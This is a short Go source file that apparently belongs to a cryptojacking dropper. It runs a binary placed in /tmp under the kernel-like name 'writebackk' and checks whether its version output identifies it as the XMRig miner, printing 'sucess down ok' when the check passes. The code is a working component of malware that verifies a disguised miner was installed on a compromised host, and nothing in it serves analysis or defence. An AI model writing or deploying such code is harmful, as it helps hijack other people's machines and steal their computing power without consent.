package main



import (

"strings"
"os/exec"
"fmt"
)



func check() int {
   

 vk_ok :=  0


v :=  exec.Command("sh" ,  "-c" , "/tmp/./writebackk -V")
 
o , e := v.CombinedOutput()

if e == nil {
 
o_str := string(o)

//fmt.Println(o_str)

if strings.Contains(o_str, "XMRig") {
if strings.Contains(o_str,  "built") { 
if strings.Contains(o_str, "hwloc") {
 

vk_ok =  1

fmt.Println("vkzmn sucess down ok")

return  1;

}}} 

 
}




fmt.Println(vk_ok)

return 0
}












